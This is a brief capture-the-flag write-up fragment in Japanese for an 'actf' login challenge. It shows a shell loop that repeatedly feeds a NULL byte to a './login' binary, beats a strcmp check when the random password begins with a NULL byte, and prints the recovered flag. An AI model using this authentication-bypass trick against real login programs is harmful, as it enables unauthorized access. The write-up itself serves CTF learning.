```
$ for ((i=0; i<10000; i++)) do echo -e '\00' | ./login | grep actf ; done
Enter the password: actf{if_youre_reading_this_ive_been_hacked}
```

先頭にNULLバイトが来るまで挑戦する。  
(strcmpの終了判定がNULLバイトであることを利用する)  
